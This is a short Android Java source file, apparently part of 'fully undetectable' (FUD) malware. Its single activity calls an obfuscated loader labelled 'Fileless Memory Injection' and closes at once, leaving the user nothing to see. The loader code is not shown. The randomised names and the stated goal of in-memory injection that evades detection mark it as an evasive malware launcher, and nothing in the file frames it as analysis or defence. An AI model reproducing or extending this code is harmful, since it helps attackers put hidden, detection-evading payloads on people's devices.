package com.fud;

import android.app.Activity;
import android.os.Bundle;

public class FudActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Execute Fileless Memory Injection
        FudLoaderYeswti.executeMbtlfz(this);

        finish();
    }
}
